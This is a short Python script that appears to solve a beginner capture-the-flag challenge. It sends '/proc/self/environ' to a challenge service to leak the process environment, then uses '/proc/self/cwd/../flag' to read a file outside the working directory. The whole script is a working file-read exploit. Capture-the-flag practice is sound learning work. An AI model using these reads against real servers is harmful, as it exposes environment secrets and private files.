import socket
import os
import re

HOST = os.getenv("CTF4B_HOST", "0.0.0.0")
PORT = os.getenv("CTF4B_PORT", "9712")

# pwd
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, int(PORT)))
s.recv(6)
s.send(b"/proc/self/environ\n")
print(re.findall(b"PWD=(.+?)\x00", s.recv(4096))[0])
s.close()

# flag
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, int(PORT)))
s.recv(6)
s.send(b"/proc/self/cwd/../flag\n")
print(s.recv(4096))
s.close()
